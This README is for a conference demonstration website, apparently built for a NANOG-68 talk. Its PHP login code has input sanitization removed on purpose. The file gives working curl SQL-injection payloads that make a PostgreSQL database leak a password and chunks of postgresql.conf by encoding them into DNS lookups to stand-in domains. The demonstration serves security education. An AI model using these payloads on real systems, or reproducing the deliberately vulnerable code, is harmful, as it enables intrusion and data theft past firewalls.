Unless you are me, you probably have no interest in anything in this directory.
This is the website used in the NANOG-68 speech. It's an amalgomation of a lightly-modified HTML template, some stock photos, and some PHP login scripts I modified to remove the input sanitizaion. I also modified the database code to work with postgres. I didn't write most of this code, but I did cobble it together.

To use the site, you need to also install postgres and setup a database called 'members'. Username and password for the database is in include/membersite_config.php.

The purpose of this site is to show how DNS exfiltration can be used to circumvent firewalls. In this demonstration, it is presumed that the database server sites behind a firewall and through SQL injection, the database can be confinced to do crafted DNS queries. The SQL injection occurs through the login form.

For example:

# Pass the word 'hello' to the database through SQL injection
# Database base64-encodes, appends domain, and does host lookup.

curl -iL -c cookie -d "submitted=1&username=coryschwartz'%20and%20hostbyname(concat(encode('hello','base64'),'.sql1.nanog.con'))='5&password=password&Submit=Submit" http://web.con/login.php

# Performs this query via SQL injection:
# SELECT password from members where username = 'coryschwartz';
# Database base64-encodes, appends domain, and does host lookup.

curl -L -c cookie -d "submitted=1&username=coryschwartz'%20and%20hostbyname(concat(encode(cast((select%20password%20from%20members%20where%20username%20=%20'coryschwartz')%20as%20bytea),'base64'),'.sql2.nanog.con'))='5&password=password&Submit=Submit" http://web.con/login.php


# Asks database to read 30 bytes from file
# Database base64-encodes, appends domain, and does host lookup.
# Repeats.

for i in {0..19800..30}
do
curl -L -c cookie -d "submitted=1&username=coryschwartz'%20and%20hostbyname(concat(encode(pg_read_binary_file('postgresql.conf',$i,30),'base64'),'.sql3.nanog.con'))='5&password=password&Submit=Submit" http://web.con/login.php
done

